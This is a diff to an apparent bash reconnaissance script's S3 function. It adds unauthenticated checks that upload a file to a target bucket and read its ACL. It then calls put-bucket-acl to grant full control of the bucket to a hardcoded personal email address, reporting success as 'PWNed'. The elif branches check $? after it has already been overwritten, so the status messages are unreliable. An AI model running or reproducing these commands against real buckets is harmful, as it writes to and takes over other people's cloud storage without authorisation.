@@ -175,13 +175,36 @@ nfs_enum() {
 # checking AWS S3 bucket
 s3() {
     clear
-    echo -e "$BLUE[+][+] Checking AWS S3 $1 bucket$CLR"
-    echo -e "\n- attempt to list content of the bucket...\n"
-    aws s3 ls "s3://$1"
+    echo -e "$BLUE[+] Checking AWS S3 $1 bucket$CLR"
+    aws s3 ls "s3://$1" --no-sign-request
     if [[ "$?" == 0 ]]; then
         echo -e "\n$GREEN+ content of the bucket can be listed!$CLR"
     elif [[ "$?" != 0 ]]; then
         echo -e "\n$RED- could not list the content... :/$CLR"
+    fi
+
+    touch test.txt
+    echo 'TEST' >> test.txt
+    aws s3 cp test.txt "s3://$1/test.txt" --no-sign-request
+    if [[ "$?" == 0 ]]; then
+        echo -e "\n$GREEN+ WOW!!! We can copy files to the bucket!!! PWNed!!!$CLR"
+    elif [[ "$?" != 0 ]]; then
+        echo -e "\n$RED- nope, cp does not work... :/$CLR"
+    fi
+    rm -f test.txt
+
+    aws s3api get-bucket-acl --bucket "$1" --no-sign-request
+    if [[ "$?" == 0 ]]; then
+        echo -e "\n$GREEN+  We can list ACL policies$CLR"
+    elif [[ "$?" != 0 ]]; then
+        echo -e "\n$RED- nope, ACL policies not readable... :/$CLR"
+    fi
+
+    aws s3api put-bucket-acl --bucket "$1" --grant-full-control emailaddress=deebiaan@gmail.com
+    if [[ "$?" == 0 ]]; then
+        echo -e "\n$GREEN+  We can grant full control!!! PWNed!!!$CLR"
+    elif [[ "$?" != 0 ]]; then
+        echo -e "\n$RED- nope, can't grant control... :/$CLR"
     fi
     echo -e "\n[+] Done."
 }
